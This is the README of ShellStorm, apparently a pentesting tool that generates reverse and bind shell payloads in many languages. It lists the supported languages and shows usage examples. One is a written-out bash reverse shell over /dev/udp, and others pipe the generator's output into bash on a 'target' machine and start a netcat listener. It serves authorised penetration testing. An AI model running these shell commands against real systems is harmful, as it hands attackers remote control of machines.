# ShellStorm
Automatic reverse/bind shell generator cheat sheet.  

A compilation of knowledge over the years from many pentesters that you will recognize  
after reading the source code to make the process of creating reverse and bind connections easier  
for cybersecurity analysts.  

* Install requirements for generate **WAR** package.  
<pre>sudo apt-get update -y && sudo apt-get install default-jdk -y</pre>

## Available languages/programs  
<pre>
asp
awk
bash
c
cpan
dart
gawk
golang
groovy
java
jsp
lua
nc
nc-nef (netcat without -e flag, mkfifo)
nodejs
openssl
perl
php
php-daemon
php-simple
ps1
ps1-ds (powershell download string)
python
ruby
sbd
socat
telnet
war
</pre>

# Screenshots
![alt text](https://github.com/0bfxGH0ST/ShellStorm/blob/main/screenshots/screenshot01.png)  
![alt text](https://github.com/0bfxGH0ST/ShellStorm/blob/main/screenshots/screenshot2.png)  

## Try go further
* In some cases you can download shellstorm in any 'target' machine with Linux kernel (or WSL) and execute it by piping it if you prefer.  
<pre>
bash shellstorm.sh bash 10.2.54.13 1337 | bash
</pre>

* Do you want UDP shell? No problem, 'sed' it.
<pre>
bash shellstorm.sh bash 127.0.0.1 1337 | sed -e 's/tcp/udp/g'
Output:
bash -c "bash -i >& /dev/udp/127.0.0.1/1337 0>&1"
</pre>

* You can pipe it too.
<pre>
bash shellstorm.sh bash 127.0.0.1 1337 | sed -e 's/tcp/udp/g' | bash
Note:  
Remember use -u (udp) flag in netcat listener as following:  
nc -u -lvp 1337
</pre>
